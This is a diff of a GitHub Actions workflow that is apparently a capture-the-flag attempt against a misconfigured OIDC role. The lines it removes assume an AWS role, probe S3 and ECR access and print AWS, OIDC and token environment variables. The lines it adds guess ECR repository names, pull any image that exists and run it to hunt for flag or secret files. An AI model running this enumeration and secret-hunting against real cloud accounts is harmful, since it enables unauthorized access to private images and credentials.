@@ -1,61 +1,27 @@
-name: ECR Login & Debug
-
-on:
-  push:
-    branches: [ main ]
-
-permissions:
-  id-token: write
-  contents: read
-
-env:
-  AWS_REGION: us-east-1
-  ECR_REGISTRY: 396961015104.dkr.ecr.us-east-1.amazonaws.com
-  ROLE_TO_ASSUME: arn:aws:iam::396961015104:role/imaginary-challenge
-
-jobs:
-  assume-and-login:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Configure AWS Credentials (OIDC)
-        id: awscreds
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: ${{ env.ROLE_TO_ASSUME }}
-          aws-region: ${{ env.AWS_REGION }}
-
-      - name: Show caller identity (quick check)
+      - name: Try Phrase-Based Names
         run: |
-          echo "==== Caller identity ===="
-          aws sts get-caller-identity || true
-
-      - name: Show effective policy simulation (best-effort)
-        run: |
-          # Best-effort: try a few read-ish operations so we can see what fails
-          echo "=== S3 buckets ==="
-          aws s3 ls || echo "No S3 access or listing failed"
-          echo "=== ECR describe-repositories (us-east-1) ==="
-          aws ecr describe-repositories --region $AWS_REGION || echo "No ECR describe access"
-          echo "=== Try to get ECR auth token ==="
-          aws ecr get-login-password --region $AWS_REGION > /dev/null && echo "get-login-password succeeded" || echo "get-login-password failed"
-
-      - name: Login to ECR (docker)
-        run: |
-          set -e
-          echo "Logging in to ECR: $ECR_REGISTRY"
-          aws ecr get-login-password --region $AWS_REGION \
-            | docker login --username AWS --password-stdin $ECR_REGISTRY
-
-      - name: Show docker images (local)
-        run: |
-          docker images --format "{{.Repository}}:{{.Tag}} {{.ID}}"
-
-      - name: Extra debug — environment & files
-        run: |
-          echo "=== ENV related to AWS/OIDC ==="
-          env | grep -iE 'AWS|OIDC|TOKEN' || true
-          echo "=== Workflow dir listing ==="
-          ls -la
+          echo "=== Trying phrases from the description ==="
+          
+          PHRASES=(
+            "never-imagined" "never_imagined" "i-never-imagined"
+            "misconfigure-cloud" "misconfigured-cloud" "cloud-misconfiguration"
+            "github-actions-insecure" "actions-insecure" "insecure-actions"
+            "fiddling-workflow" "fiddle-workflow" "workflow-fiddling"
+            "download-docker-image" "docker-download" "image-download"
+            "where-docker" "from-where" "where-from"
+            "oidc-cool" "cool-oidc" "oidc-misconfigured"
+            "be-careful" "careful-oidc" "oidc-careful"
+          )
+          
+          for phrase in "${PHRASES[@]}"; do
+            echo "Trying: $phrase"
+            if docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$phrase:latest 2>/dev/null; then
+              echo "🎉 FOUND: $phrase"
+              docker images | grep $phrase
+              echo "=== Checking container contents ==="
+              docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$phrase:latest sh -c 'find / -name "*flag*" -o -name "*secret*" -o -name "*.txt" 2>/dev/null | head -20' || \
+              docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$phrase:latest env | grep -i flag || \
+              echo "Trying to explore container..."
+              break
+            fi
+          done
